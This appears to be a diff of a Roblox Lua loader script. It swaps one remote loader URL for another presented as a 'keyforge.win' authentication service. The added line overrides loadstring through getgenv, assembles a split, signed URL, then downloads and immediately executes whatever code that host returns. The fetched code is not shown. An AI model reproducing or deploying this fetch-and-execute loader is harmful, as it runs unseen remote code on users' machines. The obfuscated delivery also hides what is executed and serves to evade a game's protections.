@@ -1,2 +1,2 @@
-script_key = "" -- your key here
-loadstring(game:HttpGet("https://api.luasec.org/loader/1737e47d74f2"))()
+-- Protected by [https://keyforge.win] authentication service
+loadstring=(type(Real)=="table" and Real.loadstring) or ((select(2,pcall(getgenv)) or {}).Real or {}).loadstring or load or loadstring loadstring(game:HttpGet("https://www.keyforge.win".."/v1/load/cmtyfkonz0mb7bq".."p49kfjgl0g?e=1&script=cm".."tyiixmf0nnxbqp4pnvnw5tz&".."lsig=QdXkYNMt68LJoAokcZ0".."Q8W3ADJ0z7QUAfh6TWyHl410".."&_cb="..tostring(os.clock()).."-"..tostring(math.random(1,1e9)),true))()
